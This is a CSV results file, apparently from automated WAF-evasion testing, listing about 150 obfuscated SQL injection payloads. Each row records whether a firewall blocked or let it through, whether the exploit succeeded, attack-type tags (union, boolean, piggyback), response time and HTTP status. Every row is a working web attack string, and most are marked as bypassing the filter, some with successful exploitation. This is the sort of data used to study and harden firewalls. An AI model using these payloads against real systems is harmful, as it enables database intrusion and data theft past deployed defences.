Payload,Status,Exploit Success,Exploit Types,Payload Type,Response Time (s),Memory Usage (MB),Semantic Preserved,Response Code
0%27<@!=1.%0bor+1+like%0b{a+1}=1+or%27,Bypassed,Yes,unionAtk,Unknown,0.015,70.19,No,200
0'<@=1.+||+not+{a+1}=1=%0b(false)+or',Bypassed,No,None,booleanAtk,0.0177,70.19,No,500
0'<@=.1+or%0b!+{a+1}=1=%0b(not%0b{x%0b(select%0b1)}=1)%0b||%27,Bypassed,No,None,Unknown,0.0084,70.19,No,500
0%27<@=1%0b||%0b!+{a%0b1}=1=+(not%0b{x%0b(select%0b1)}=1)%0bor%27,Bypassed,Yes,unionAtk,Unknown,0.0178,70.19,No,200
0'<@=.1+or+not+{a%0b1}=1=+(!%0b{x+(select+1)}=1)--+,Bypassed,No,None,piggyAtk,0.0126,70.19,No,500
0'<@=1+||%0b!~false=+(!+{`if`+1}=1)+or%27,Bypassed,No,None,booleanAtk,0.0132,70.19,No,500
0%27<@=1.%0b||%0bnot%7e0=+(not+{`if`%0b1}=1)%0bor%27,Bypassed,Yes,unionAtk,Unknown,0.0192,70.19,No,200
0'<@!=.1+or+not+1=%0b(!+{x+(select+1)}=1)%0bor%27,Bypassed,No,None,Unknown,0.0092,70.19,No,500
0%27<@!=1.+or%0b{x+(select+1)}=1+like+{a+1}=1+||%27,Bypassed,Yes,unionAtk,Unknown,0.0138,70.19,No,200
0'<@!=.1%0b||+!+{x%0b(select+1)}=1=%0b(not%7efalse)+or',Bypassed,No,None,booleanAtk,0.0165,70.19,No,500
0%27<@!=.1%0bor+not%0b{a+1}=1=%0b(!%0b{x+(select+1)}=1)+or',Bypassed,No,None,Unknown,0.0112,69.19,No,500
0%27<@=.1+||+not+{`if`%0b1}=1=+(not%0b{x+(select+1)}=1)+||%27,Bypassed,Yes,unionAtk,Unknown,0.0098,69.67,No,200
0%27<@!=.1+||+not+{x+(select+1)}=1=+(not+{x%0b(select%0b1)}=1)+or',Blocked,No,None,Unknown,0.0115,69.94,No,403
0%27<@=.1+||%0b!+{x+(select%0b1)}=1=%0b(!~false)+||%27,Blocked,No,None,Unknown,0.008,69.94,No,403
0%27<@=.1+||%0bnot%0b{`if`%0b1}=1=%0b(!+{a+1}=1)+||%27,Bypassed,Yes,unionAtk,Unknown,0.0221,69.94,No,200
0'<@!=1.%0bor+not+{`if`+1}=1=+(!~0)%23,Bypassed,No,None,piggyAtk,0.0237,69.94,No,500
0%27<@!=.1%0b||+not%0b{x%0b(select%0b1)}=1=%0b(not%0btrue)+or%27,Bypassed,Yes,unionAtk,booleanAtk,0.0121,69.94,No,200
0%27<@!=.1+or+!+{`if`+1}=1=+(!+{x+(select+1)}=1)+||%27,Bypassed,Yes,unionAtk,Unknown,0.0191,69.94,No,200
0'<@=1.+or+not+1=+(not+{a+1}=1)--+,Blocked,No,None,piggyAtk,0.0129,69.94,No,403
0'<@!=1%0bor%0b!%0b{x+(select+1)}=1=+(not+{`if`%0b1}=1)%0bor%27,Bypassed,No,None,Unknown,0.0163,69.94,No,500
0'<@!=1+or%0b!%0b1=%0b(!+{`if`%0b1}=1)%0bor%27,Bypassed,No,None,Unknown,0.0126,69.94,No,500
0%27<@!=.1%0b||+not+{x%0b(select+1)}=1=%0b(not%7efalse)--+,Bypassed,Yes,unionAtk,piggyAtk,0.0186,69.94,No,200
0'<@!=1.+||%0bnot+{a+1}=1=%0b(!+{`if`%0b1}=1)%23,Bypassed,No,None,piggyAtk,0.0106,69.94,No,500
0'<@=1.%0bor%0b!%0b{x%0b(select+1)}=1=+(not%0b{a%0b1}=1)%0b||',Bypassed,No,None,Unknown,0.0142,69.94,No,500
0'<@=1%0bor+not%7efalse%0bis%0bfalse%0bor',Bypassed,No,None,booleanAtk,0.0123,69.94,No,500
0'<@=1.+or+not%0b{`if`+1}=1=+(!+{a%0b1}=1)+||%27,Bypassed,No,None,Unknown,0.0124,70.19,No,500
0'<@=1+||%0b!~0=%0b(not+{x+(select%0b1)}=1)%23,Bypassed,No,None,piggyAtk,0.0101,70.19,No,500
0%27<@=.1+||+not%7e0=%0b(not%0b{x+(select+1)}=1)+or%27,Bypassed,Yes,unionAtk,Unknown,0.0094,70.19,No,200
0%27<@=1.+or%0bnot%0b{`if`+1}=1=%0b(not%0b{x+(select+1)}=1)+or',Bypassed,No,None,Unknown,0.0154,70.19,No,500
0%27<@=1.%0bor+!%0b{`if`+1}=1+is+false+or',Bypassed,No,None,booleanAtk,0.0186,70.19,No,500
0%27<@!=1+||+not+{x+(select+1)}=1=+(not+{x+(select+1)}=1)%0bor%27,Blocked,No,None,Unknown,0.0059,70.19,No,403
0%27<@=.1%0bor%0bnot+{`if`%0b1}=1=+(!+{a%0b1}=1)%0bor%27,Bypassed,Yes,unionAtk,Unknown,0.0119,70.19,No,200
0%27<@=.1%0bor%0bnot%0b{`if`%0b1}=1=%0b(not%0b{x%0b(select%0b1)}=1)%0b||',Bypassed,No,None,Unknown,0.012,70.19,No,500
0%27<@!=.1%0b||+!%0b{a+1}=1=%0b(not+1)+or',Bypassed,No,None,Unknown,0.0197,70.19,No,500
0'<@=1.+or+!+{a%0b1}=1=+(not%0b{x%0b(select%0b1)}=1)%23,Bypassed,No,None,piggyAtk,0.011,70.19,No,500
0%27<@!=.1%0bor%0bnot+1=%0b(!%0b1)%23,Bypassed,Yes,unionAtk,piggyAtk,0.0144,70.19,No,200
0'<@!=1.+||+not+{x+(select+1)}=1=%0b(not~0)+or%27,Blocked,No,None,Unknown,0.0069,70.19,No,403
0%27<@!=1.%0b||+!%0b{`if`%0b1}=1=%0b(!~0)+||%27,Bypassed,Yes,unionAtk,Unknown,0.0108,70.19,No,200
0%27<@=1%0b||+not%0b{a%0b1}=1=%0b(not%0btrue)+or%27,Bypassed,Yes,unionAtk,booleanAtk,0.0191,70.19,No,200
0'<@=1.+or%0bnot+{x+(select%0b1)}=1=+(!%0b{a+1}=1)%23,Blocked,No,None,piggyAtk,0.0135,70.19,No,403
0%27<@!=1.+||%0bnot+{`if`%0b1}=1=%0b(not+{`if`+1}=1)+||',Bypassed,No,None,Unknown,0.0122,70.19,No,500
0'<@!=.1%0bor%0bnot+{x+(select+1)}=1=%0b(not%0b{`if`+1}=1)+or%27,Bypassed,No,None,Unknown,0.0169,70.19,No,500
0%27<@=1+or+!+{a+1}=1=%0b(!+{x%0b(select+1)}=1)+||',Bypassed,No,None,Unknown,0.0105,70.19,No,500
0%27<@!=1.+or%0bnot%7efalse=%0b(!%0b{a+1}=1)+or%27,Bypassed,Yes,unionAtk,booleanAtk,0.021,70.19,No,200
0'<@!=.1%0b||+0=+(!%0b{x%0b(select%0b1)}=1)--+,Bypassed,No,None,piggyAtk,0.0139,70.19,No,500
0%27<@!=1+||+!~0=%0b(false)+or',Bypassed,No,None,booleanAtk,0.0083,70.19,No,500
0'<@=1.%0bor%0bnot+true=+(!+{x+(select+1)}=1)+||',Bypassed,No,None,booleanAtk,0.0149,70.19,No,500
0%27<@=1.%0bor+not%0btrue=%0b(!+{x+(select+1)}=1)+or',Bypassed,No,None,booleanAtk,0.0121,70.19,No,500
0%27||%0b!@<@.+or+{x%0b(select%0b1)}=1+like%0btrue%0bor',Bypassed,No,None,booleanAtk,0.0178,70.19,No,500
0%27<@=1%0b||+{x+(select+1)}=1+like+{a%0b1}=1%23,Bypassed,Yes,unionAtk,piggyAtk,0.017,70.19,No,200
0'<@!=1.%0bor+!+{x%0b(select%0b1)}=1=+(!%0b{x+(select+1)}=1)%0bor',Bypassed,No,None,Unknown,0.0075,70.19,No,500
0%27<@=.1+or+!%0b{`if`%0b1}=1=+(not+{`if`+1}=1)%0bor',Bypassed,No,None,Unknown,0.0115,70.19,No,500
0%27<@=1.+||%0bnot+{x+(select%0b1)}=1=+(not%7efalse)--+,Blocked,No,None,piggyAtk,0.0129,70.19,No,403
0'<@=.1+or%0bnot%0b{`if`%0b1}=1=%0b(not+{a%0b1}=1)%0b||%27,Bypassed,No,None,Unknown,0.0122,70.19,No,500
0'<@=1%0bor+!%0b{x+(select+1)}=1=+(not+1)%23,Bypassed,No,None,piggyAtk,0.0153,70.19,No,500
0'<@=.1%0bor%0bnot%0b{x%0b(select+1)}=1=+(not%0btrue)+or%27,Bypassed,No,None,booleanAtk,0.0173,70.19,No,500
0%27<@!=.1%0bor+not+true=%0b(not%0b{x+(select%0b1)}=1)+or%27,Bypassed,Yes,unionAtk,booleanAtk,0.0217,70.19,No,200
0'<@=1.%0b||%0b!+{a%0b1}=1=+(not+{x+(select%0b1)}=1)%0b||',Bypassed,No,None,Unknown,0.0172,70.19,No,500
0%27<@=1.%0b||+{`if`+1}=1%0blike%0b{x%0b(select+1)}=1--%0b,Bypassed,Yes,unionAtk,piggyAtk,0.0112,70.19,No,200
0%27<@!=1.+||+not%7e0=%0b(not%0b1)+or%27,Bypassed,Yes,unionAtk,Unknown,0.0196,70.19,No,200
0'<@!=.1+||%0bnot+{x%0b(select%0b1)}=1=+(not%0b{x+(select+1)}=1)%0b||',Bypassed,No,None,Unknown,0.0136,69.28,No,500
0%27<@=.1+or+!%0btrue=%0b(not+{x%0b(select+1)}=1)%0b||',Bypassed,No,None,booleanAtk,0.0127,69.94,No,500
0%27<@=1%0b||+not%0b{a%0b1}=1=%0b(not%0b{x%0b(select%0b1)}=1)%23,Bypassed,Yes,unionAtk,piggyAtk,0.0121,69.94,No,200
0%27<@=1+||+not%0b{a+1}=1=%0b(not%0btrue)+or%27,Bypassed,Yes,unionAtk,booleanAtk,0.0172,69.94,No,200
0%27<@=1%0b||+not+{`if`%0b1}=1=+(!%0b{a+1}=1)%0b||',Bypassed,No,None,Unknown,0.024,69.94,No,500
0%27<@!=.1+||+!+true=+(!%0b{x+(select%0b1)}=1)%0bor%27,Bypassed,Yes,unionAtk,booleanAtk,0.0198,69.94,No,200
0'<@!=1+||%0bnot+true=%0b(!+{x+(select+1)}=1)+or%27,Bypassed,No,None,booleanAtk,0.0165,69.94,No,500
0%27<@!=.1+||+not%0b{a+1}=1=+(0)--+,Blocked,No,None,piggyAtk,0.0135,69.94,No,403
0'<@=.1+or+{x+(select%0b1)}=1%0blike%0b{x%0b(select+1)}=1+or',Blocked,No,None,Unknown,0.0112,69.94,No,403
0'<@=1.%0b||+!+{x+(select+1)}=1=%0b(!%0btrue)%0b||%27,Bypassed,No,None,Unknown,0.0144,69.94,No,500
0'<@=1.+or%0bnot+{`if`%0b1}=1=%0b(not+{x%0b(select%0b1)}=1)--+,Bypassed,No,None,piggyAtk,0.0238,69.94,No,500
0%27<@=.1%0b||%0bnot+{`if`+1}=1=+(!%0b{x%0b(select+1)}=1)+||%27,Bypassed,Yes,unionAtk,Unknown,0.0131,69.94,No,200
0%27<@=.1%0bor+not+{x%0b(select+1)}=1=%0b(!+{x%0b(select+1)}=1)%0b||',Bypassed,No,None,Unknown,0.0152,70.07,No,500
0'<@!=1.+or+!+{`if`%0b1}=1=+(!+{x%0b(select%0b1)}=1)+or',Bypassed,No,None,Unknown,0.0069,70.19,No,500
0%27<@=1%0b||%0bnot+{x%0b(select%0b1)}=1=+(not%0b{x+(select+1)}=1)+||%27,Bypassed,Yes,unionAtk,Unknown,0.022,70.19,No,200
0%27<@!=1%0bor+{x%0b(select%0b1)}=1+like%0b{`if`%0b1}=1+||',Bypassed,No,None,Unknown,0.011,70.19,No,500
0'<@=.1+||+!%0b{`if`%0b1}=1=%0b(not+{x+(select+1)}=1)%0b||',Bypassed,No,None,Unknown,0.0105,70.19,No,500
0%27<@=.1%0b||%0b!%0b1=+(!%0b{x+(select%0b1)}=1)%0bor',Bypassed,No,None,Unknown,0.0158,70.19,No,500
0%27<@!=.1%0b||+{x%0b(select%0b1)}=1+like+true+||',Bypassed,No,None,Unknown,0.0089,70.19,No,500
0'<@=1.+or%0bnot%0b{`if`+1}=1=%0b(not%0b{a%0b1}=1)+or%27,Bypassed,No,None,Unknown,0.011,70.19,No,500
0'or+1<@.+or%0b!%0b{x%0b(select+1)}=1=+(!%0b1)+or%27,Bypassed,No,None,Unknown,0.0108,70.19,No,500
0'<@=1.%0b||%0b{x+(select%0b1)}=1+like%0b{`if`+1}=1--+,Bypassed,No,None,piggyAtk,0.0085,70.19,No,500
0%27<@=1.%0bor+!%7efalse=+(!+1)%0b||%27,Bypassed,Yes,unionAtk,booleanAtk,0.0149,70.19,No,200
0%27<@!=1.%0bor%0bnot%0b{`if`+1}=1=%0b(not~false)+or%27,Bypassed,Yes,unionAtk,booleanAtk,0.0091,70.19,No,200
0%27<@=.1%0b||%0bnot%0b{x+(select+1)}=1=+(not~0)+or',Bypassed,No,None,Unknown,0.0106,70.19,No,500
0%27<@=1+||%0bnot+{x%0b(select%0b1)}=1%0bis+false+or%27,Bypassed,Yes,unionAtk,booleanAtk,0.0138,70.19,No,200
0'<@=1%0b||%0b!+{`if`+1}=1=%0b(not+{`if`+1}=1)%0bor',Bypassed,No,None,Unknown,0.0156,70.19,No,500
0%27<@!=1+||+not+{x%0b(select%0b1)}=1=+(not%0b{`if`%0b1}=1)+or',Bypassed,No,None,Unknown,0.0155,70.19,No,500
0%27<@!=.1+||%0b!%0b{x%0b(select+1)}=1=%0b(not+true)+or%27,Bypassed,Yes,unionAtk,booleanAtk,0.0152,70.19,No,200
0'<@!=.1+or%0b0=%0b(!+{x+(select+1)}=1)--%0b,Blocked,No,None,piggyAtk,0.0042,70.19,No,403
0'<@!=1%0b||%0b!%0b1=%0b(!%0b{x%0b(select%0b1)}=1)+or',Bypassed,No,None,Unknown,0.0104,70.19,No,500
0%27<@!=1+||%0bnot%7e0=+(!+{x+(select+1)}=1)--+,Blocked,No,None,piggyAtk,0.0114,70.19,No,403
0%27<@=1.+||+not+{`if`%0b1}=1=+(not%0b{x+(select+1)}=1)%23,Bypassed,Yes,unionAtk,piggyAtk,0.0152,70.19,No,200
0'<@!=1+||%0bnot+{a+1}=1=+(!%0b{`if`+1}=1)%0b||',Bypassed,No,None,Unknown,0.0091,70.19,No,500
0'<@=1%0bor%0b!+{x+(select%0b1)}=1=%0b(not+{x%0b(select+1)}=1)+or%27,Bypassed,No,None,Unknown,0.0101,70.19,No,500
0'<@!=1%0bor+not%0b{x%0b(select%0b1)}=1=%0b(not%0b{x+(select%0b1)}=1)+||',Bypassed,No,None,Unknown,0.0183,70.19,No,500
0'<@!=1+||+not+{a+1}=1=+(!+{`if`%0b1}=1)--%0b,Bypassed,No,None,piggyAtk,0.0155,70.19,No,500
0'<@!=.1%0bor+not%0btrue=%0b(!%0b{x+(select+1)}=1)+or%27,Bypassed,No,None,booleanAtk,0.0197,70.19,No,500
0'<@!=1.+or+!+{`if`%0b1}=1=+(!%0btrue)--%0b,Bypassed,No,None,piggyAtk,0.0213,70.19,No,500
0%27<@!=1+or+not%0b{x%0b(select+1)}=1+is%0bfalse--+,Bypassed,Yes,unionAtk,piggyAtk,0.0121,70.19,No,200
0%27<@=1.+or+{x%0b(select%0b1)}=1+like%0b{x%0b(select%0b1)}=1+||',Bypassed,No,None,Unknown,0.0112,70.19,No,500
0'<@=.1+or%0b!%0b{x%0b(select+1)}=1=%0b(not+{x%0b(select%0b1)}=1)%23,Blocked,No,None,piggyAtk,0.0143,70.19,No,403
0'<@!=1+or+!%0btrue=%0b(not+{x%0b(select%0b1)}=1)%23,Bypassed,No,None,piggyAtk,0.0087,70.19,No,500
0%27<@!=1%0bor+not+{x+(select+1)}=1=+(not+{x%0b(select%0b1)}=1)+||%27,Bypassed,Yes,unionAtk,Unknown,0.012,70.19,No,200
0%27<@=1.%0bor%0b!+{x%0b(select+1)}=1=+(!+{a%0b1}=1)+or',Bypassed,No,None,Unknown,0.0113,70.19,No,500
0'<@!=1%0bor+not+{`if`%0b1}=1=%0b(not%0b{x+(select%0b1)}=1)--%0b,Bypassed,No,None,piggyAtk,0.0103,70.19,No,500
0%27<@!=.1%0b||+!%0b{x+(select+1)}=1=+(not%0b{x%0b(select+1)}=1)--+,Bypassed,Yes,unionAtk,piggyAtk,0.0078,70.19,No,200
0'<@!=1%0b||+not+{`if`%0b1}=1=+(!%0b{a+1}=1)%0bor',Bypassed,No,None,Unknown,0.0124,70.19,No,500
0'<@=1+||+not%0b{x+(select%0b1)}=1=%0b(not~false)+||',Bypassed,No,None,Unknown,0.0138,70.19,No,500
0'<@!=.1+or+!+{x+(select+1)}=1=+(not%0b{a+1}=1)%0bor%27,Blocked,No,None,Unknown,0.0171,70.19,No,403
0'<@=.1+or%0bnot%0b{x+(select+1)}=1=+(not+{`if`%0b1}=1)--+,Blocked,No,None,piggyAtk,0.0076,69.39,No,403
0'<@=1.%0b||+not+{x+(select+1)}=1=+(!~false)%0bor%27,Bypassed,No,None,booleanAtk,0.0098,69.94,No,500
0%27<@!=1+or+!+true=+(not+{a%0b1}=1)+or%27,Bypassed,Yes,unionAtk,booleanAtk,0.0174,69.94,No,200
0'<@=1.+or%0bnot%7efalse=%0b(!+{a+1}=1)--%0b,Blocked,No,None,piggyAtk,0.0052,69.94,No,403
0%27<@!=1%0b||+!%0b{x+(select%0b1)}=1=%0b(not~0)+||%27,Bypassed,Yes,unionAtk,Unknown,0.0152,69.94,No,200
0%27<@=.1+||+not%0b{x%0b(select+1)}=1=+(not+{x+(select%0b1)}=1)%23,Bypassed,Yes,unionAtk,piggyAtk,0.0188,69.94,No,200
0'<@!=.1+||%0b!+{x+(select%0b1)}=1=%0b(not%0b{x%0b(select%0b1)}=1)%0bor%27,Blocked,No,None,Unknown,0.0028,69.94,No,403
0%27<@!=.1%0bor+not+{a%0b1}=1=+(!+{`if`+1}=1)+or',Bypassed,No,None,Unknown,0.0136,69.94,No,500
0'<@=1.+or+not%0b{a+1}=1=+(not+{x+(select%0b1)}=1)--+,Blocked,No,None,piggyAtk,0.0129,69.94,No,403
0%27<@!=1.+or+not%7efalse=+(!%0b{a+1}=1)%0bor%27,Bypassed,Yes,unionAtk,booleanAtk,0.016,69.94,No,200
0'<@!=.1%0b||%0b!%0b{x+(select%0b1)}=1=+(not%0b{x%0b(select+1)}=1)%0b||%27,Bypassed,No,None,Unknown,0.0123,69.94,No,500
0'<@!=1%0b||%0bnot+{`if`%0b1}=1=+(not+{x+(select%0b1)}=1)+or',Bypassed,No,None,Unknown,0.0195,69.94,No,500
0%27<@=1.+or%0bnot%0b{x+(select%0b1)}=1=+(not+{x+(select+1)}=1)--%0b,Blocked,No,None,piggyAtk,0.0136,69.94,No,403
0'<@!=.1%0bor%0b!+true=%0b(not%0b{a+1}=1)%0bor',Bypassed,No,None,booleanAtk,0.0211,69.94,No,500
0%27<@!=.1%0b||+not~false=%0b(not+{a+1}=1)%0b||%27,Bypassed,Yes,unionAtk,Unknown,0.0136,70.07,No,200
0%27<@!=1%0bor+!%0b{x+(select%0b1)}=1=%0b(not%0b{x+(select%0b1)}=1)+||',Bypassed,No,None,Unknown,0.0132,70.19,No,500
0'<@!=.1%0bor+!%0b{x+(select%0b1)}=1=%0b(!~0)%0bor',Bypassed,No,None,Unknown,0.0171,70.19,No,500
0'<@=.1+or%0bnot+1=%0b(not%0b{`if`+1}=1)+or%27,Bypassed,No,None,Unknown,0.0108,70.19,No,500
0%27<@=1+||%0bnot+{x%0b(select+1)}=1=+(false)--%0b,Bypassed,Yes,unionAtk,piggyAtk,0.0116,70.19,No,200
0'<@!=1.%0bor+not+{x+(select%0b1)}=1=%0b(!+true)--+,Bypassed,No,None,piggyAtk,0.0201,70.19,No,500
0'<@=1.+||%0bnot%0b{x%0b(select%0b1)}=1=%0b(not+{x+(select+1)}=1)+or',Blocked,No,None,Unknown,0.0122,70.19,No,403
0%27<@=1.+||+!+{a+1}=1=%0b(not+1)%0bor',Bypassed,No,None,Unknown,0.0164,70.19,No,500
0'<@=1+||+!%0btrue=+(!%7e0)+||',Bypassed,No,None,Unknown,0.0144,70.19,No,500
0'<@!=1%0b||%0bnot+{`if`%0b1}=1=%0b(not+1)%0b||%27,Bypassed,No,None,Unknown,0.0172,70.19,No,500
0'<@!=.1+||+!+{x+(select%0b1)}=1=+(not+{`if`%0b1}=1)--%0b,Blocked,No,None,piggyAtk,0.0099,70.19,No,403
0'<@=1%0bor%0b{x%0b(select%0b1)}=1+like+{x%0b(select+1)}=1%0b||',Bypassed,No,None,Unknown,0.011,70.19,No,500
0%27<@!=1.+||+not~false=%0b(not+{x%0b(select%0b1)}=1)%0b||%27,Bypassed,Yes,unionAtk,Unknown,0.0133,70.19,No,200
0%27<@=1.%0bor+not%0b{x%0b(select+1)}=1=%0b(not%0b{x%0b(select+1)}=1)+or',Bypassed,No,None,Unknown,0.0127,70.19,No,500
0'<@=1+||+not%7e0=+(not%0b{`if`+1}=1)--+,Bypassed,No,None,piggyAtk,0.0099,70.19,No,500
0%27<@!=.1%0bor+false=+(!%7e0)+or',Bypassed,No,None,booleanAtk,0.0125,70.19,No,500
0'<@!=.1%0b||+not+{a%0b1}=1=+(not+{a%0b1}=1)%0b||%27,Bypassed,No,None,Unknown,0.0139,70.19,No,500
0%27<@!=1.+||%0bnot%7e0=+(not%0b{x%0b(select%0b1)}=1)%0b||%27,Bypassed,Yes,unionAtk,Unknown,0.0194,70.19,No,200
0%27||%0b@<@.+or+!%0b{a+1}=1=%0b(!+{x%0b(select%0b1)}=1)%0b||%27,Bypassed,Yes,unionAtk,Unknown,0.0102,70.19,No,200
0'<@!=.1%0b||+not+{a+1}=1=%0b(!+{a%0b1}=1)%23,Bypassed,No,None,piggyAtk,0.0169,70.19,No,500
0'<@!=.1+or+!%7e0=+(not+{`if`%0b1}=1)%23,Bypassed,No,None,piggyAtk,0.0179,70.19,No,500
0'<@=1.+||%0b0=+(!+{x%0b(select+1)}=1)+or%27,Bypassed,No,None,Unknown,0.012,70.19,No,500
